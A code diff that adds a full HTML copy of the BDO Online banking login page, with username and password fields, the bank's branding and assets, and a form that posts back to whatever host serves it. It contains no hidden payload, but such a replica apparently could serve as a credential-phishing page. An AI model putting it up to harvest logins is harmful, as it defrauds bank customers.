@@ -1,0 +1,225 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html class="" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta charset="utf-8"/>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<meta content="noindex, nofollow" name="robots"/>
+<meta content="no-cache, no-store, must-revalidate" http-equiv="Cache-control"/>
+<meta content="no-cache" http-equiv="Pragma" id="metaCache"/>
+<meta content="width=device-width,initial-scale=1" name="viewport"/>
+<title>BDO Online</title>
+<link rel="icon" href="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/assets/favicon.png" />
+    <link href="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/lib/backbase-theme/dist/backbase-theme.css" rel="stylesheet" />
+    <link href="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/lib/backbase-identity/styles/identity.css" rel="stylesheet" />
+    <link href="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/css/fonts.css" rel="stylesheet" />
+    <link href="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/css/index.css" rel="stylesheet" />
+    <link href="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/css/tnc.css" rel="stylesheet" />
+<script type="text/javascript" src="https://www.onlinebanking.bdo.com.ph/ruxitagentjs_ICA27NVfgjqrux_10279231130031246.js" data-dtconfig="uam=1|app=dd1f4aec5042a6f6|coo=1|featureHash=ICA27NVfgjqrux|vcv=2|reportUrl=https://www.onlinebanking.bdo.com.ph/rb_50e9b2f1-b0e2-4715-9743-be72f589d1a4|rdnt=1|uxrgce=1|bp=3|cuc=orejesa5|mel=100000|expw=1|dpvc=1|ssv=4|lastModification=1722997237569|tp=500,50,0,1|agentUri=https://www.onlinebanking.bdo.com.ph/ruxitagentjs_ICA27NVfgjqrux_10279231130031246.js"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/lib/backbase-identity/scripts/load-background.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/ezuba.min.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/fico.ezrba.min.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/fico.user.agent.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/custom.dt.event.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/verify-otp.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/checkDeviceForm.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/customerSupportModal.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/dropdownHandler.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/modal.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/passwordField.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/selectDeviceForm.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/usernameThenPassword.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/reset-password.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/forgot-username.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/forgot-password-otp.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/set-new-password.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/terms-modal.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/terms.js" type="text/javascript"></script>
+    <script src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/scripts/pb-script.js" type="text/javascript"></script>
+</head>
+    <body onload="loadBackground();loginInit();">
+    <div class="bb-stack bb-stack--wrap vh-100">
+    <div class="bb-stack__item bb-stack__item--fill identity-bg-layout"></div>
+    <div class="bb-stack__break bb-stack__break--md-down"></div>
+    <div class="bb-stack__item bb-stack__item--fill identity-container">
+    <div class="identity-container__panel identity-container__panel--animated">
+        <div id="kc-header" class="d-none">
+        <div id="kc-header-wrapper" class=""><div class="kc-logo-text"><span>Retail</span></div></div>
+        </div>
+        <div class="identity-container__form">
+    <div class="bb-stack justify-content-sm-start justify-content-center">
+      <div class="bb-stack__item identity-logo bb-block bb-block--lg"></div>
+    </div>
+        <header>
+            <h1 id="kc-page-title" class="kc-page-title" 
+                style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 
+                    'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
+                    font-weight: 500;">
+                Welcome to BDO Online!
+            </h1>
+        </header>
+
+        <div class="bb-subtitle bb-block bb-subtitle--lg d-none">
+            <span>Securely sign in with your credentials</span>
+        </div>
+        <div id="kc-form">
+            <div id="kc-form-wrapper">
+        <form action="" method="POST" id="kc-form-login">
+            <div class="form-group bb-form-field bb-form-field--md">
+                <label for="username" class="label" 
+                    style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 
+                        'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';">
+                    Username
+                </label>
+                <input tabindex="1" id="username" class="form-control" name="username" value="" type="text" autofocus="" autocomplete="off" onfocus="this.removeAttribute('readonly');" oninput="loginController.onInput()">
+                <small id="username-validation-msg" class="bb-input-validation-message d-none" role="alert">Enter username</small>
+            </div> 
+            <div class="form-group bb-form-field bb-form-field--md">
+            <label for="password" class="label" 
+                style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 
+                    'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';">
+                Password
+            </label>
+            <input class="d-none" type="text" id="inputUBAData" name="inputUBAData" value="" readonly="readonly"/>
+            <div class="position-relative">
+                    <input tabindex="2" id="password" class="form-control" name="password" type="password" autocomplete="off" onfocus="this.removeAttribute('readonly');"/>
+                    <span aria-hidden="true" id="toggle-password" class="position-absolute bb-icon bb-icon-visibility bb-icon--md toggle-password" onclick="togglePassword()"></span>
+            </div>
+                    <small id="password-validation-msg" class="bb-input-validation-message d-none" role="alert">Enter password</small>
+            </div>
+                <div class="form-group bb-form-field bb-form-field--md bb-block bb-block--lg pt-2">
+            <div id="kc-form-buttons" class="bb-button-bar bb-button-bar--reverse">
+                <input tabindex="4" class="bb-button-bar__button btn btn-primary" name="login" id="kc-login" type="submit" value="Log in"
+                    style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 
+                        'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';"/>
+            </div>
+            </div>
+        </form>
+
+        <hr class="bb-block bb-block--lg"/>
+
+            <!-- Sign up link -->
+            <div id="kc-registration" class="bb-subtitle bb-block bb-block--xl bb-text-align-center--sm-down mt-4">
+                <span class="registration-link" 
+                    style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 
+                        'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';">
+                    Don't have Online Banking yet? 
+                    <a tabindex="6" href="https://onlinebanking.bdo.com.ph/en/registration" 
+                        style="font-family: inherit; text-decoration: none;">
+                        Sign up
+                    </a>
+                </span>
+            </div>
+
+            <!-- Reset password instructions -->
+            <div>
+                <div class="bb-highlight bb-block bb-block--sm bb-text-align-center--sm-down bb-input-info-message" 
+                    style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 
+                        'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';">
+                    Need help logging in?
+                </div>
+                <div class="bb-subtitle bb-block bb-block--sm bb-text-align-center--sm-down">
+                    <span 
+                        style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 
+                            'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';">
+                        <a tabIndex="5" href="https://onlinebanking.bdo.com.ph/auth/realms/retail/custom-login-actions/forgot-username?client_id=bb-web-client&tab_id=1OXVo6Rr504">
+                            I'd like to get my username
+                        </a>
+                    </span>
+                </div>
+
+                <div class="bb-subtitle bb-block bb-block--sm bb-text-align-center--sm-down">
+                    <span 
+                        style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 
+                            'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';">
+                        <a tabindex="5" href="https://onlinebanking.bdo.com.ph/auth/realms/retail/login-actions/reset-credentials?client_id=bb-web-client&tab_id=1OXVo6Rr504">
+                            I'd like to reset my password
+                        </a>
+                    </span>
+                </div>
+            </div>
+
+            <!-- New website instructions -->
+            <div class="new-website-instructions bb-subtitle mt-4" 
+                style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 
+                    'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';">
+                Need more information? Click 
+                <a href="https://www.bdo.com.ph/personal/digital/bdo-online#faqtabs-6ed906164d-item-6600fb21aa-tab" 
+                target="_blank" class="font-weight-bold" style="font-family: inherit;">
+                here
+                </a>
+            </div>
+
+            <hr class="bb-block bb-block--lg"/>
+            <div class="bdo-quick-link--container">
+                <div class="bb-stack bdo-quick-link--item">
+                    <a href="https://online.bdo.com.ph/sso/login?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check" 
+                    onclick="dtEventController.qlEvent('1')" target="_blank" 
+                    style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 
+                            'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';">
+                        <div class="bb-stack__item bdo-quick-link--space">
+                            <img src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/assets/link-icon-1.svg" 
+                                alt="" class="bdo-quick-link--img"/>
+                        </div>
+                        <div class="bb-stack__item">
+                            <div>My Trust Investments</div>
+                        </div>
+                    </a>
+                </div>
+                
+                <div class="bb-stack bdo-quick-link--item">
+                    <a href="https://www.bdo.com.ph/apply" onclick="dtEventController.qlEvent('2')" target="_blank" 
+                    style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 
+                            'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';">
+                        <div class="bb-stack__item bdo-quick-link--space">
+                            <img src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/assets/link-icon-2.svg" 
+                                alt="" class="bdo-quick-link--img"/>
+                        </div>
+                        <div class="bb-stack__item">
+                            <div>Apply Now</div>
+                        </div>
+                    </a>
+                </div>
+                <div class="bb-stack bdo-quick-link--item ">
+                <a href="https://www.clg.bdo.com.ph/en/web/clg/card-activation" onclick="dtEventController.qlEvent('3')" target="_blank">
+                    <div class="bb-stack__item bdo-quick-link--space">
+                    <img src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/assets/link-icon-3.svg" alt="" class="bdo-quick-link--img"/>
+                    </div>
+                    <div class="bb-stack__item">
+                    <div> Activate Credit Card </div>
+                    </div>
+                </a>
+                </div>
+                <div class="bb-stack bdo-quick-link--item ">
+                <a href="https://www.bdo.com.ph/personal/digital/bdo-online" onclick="dtEventController.qlEvent('4')" target="_blank">
+                    <div class="bb-stack__item bdo-quick-link--space">
+                    <img src="https://www.onlinebanking.bdo.com.ph/auth/resources/qifnn/login/bdo/assets/link-icon-4.svg" alt="" class="bdo-quick-link--img"/>
+                    </div>
+                    <div class="bb-stack__item">
+                    <div> FAQs </div>
+                    </div>
+                </a>
+                </div>
+            </div>
+            </div>
+            <input class="d-none" type="text" id="isDynatraceEnabled" value="true" readonly="readonly"/>
+        </div>
+        </div>
+    </div>
+    </div>
+</div>
+<div id="bb-modal" aria-modal="true" hidden="">
+    <div aria-hidden="true" class="modal-backdrop fade show"></div>
+    <div role="dialog" tabindex="-1" class="modal fade show" style="display: block" aria-modal="true">
+    <div class="modal-dialog" data-role="login-template__modal">
+        <div class="modal-content">
+        <div class="modal-header" id="bb-modal-header"></div>
+        <div class="modal-body" id="bb-modal-body"></div>
+        </div>
+    </div>
+    </div>
+</div>
+        
+
+    </body>
+</html>
+
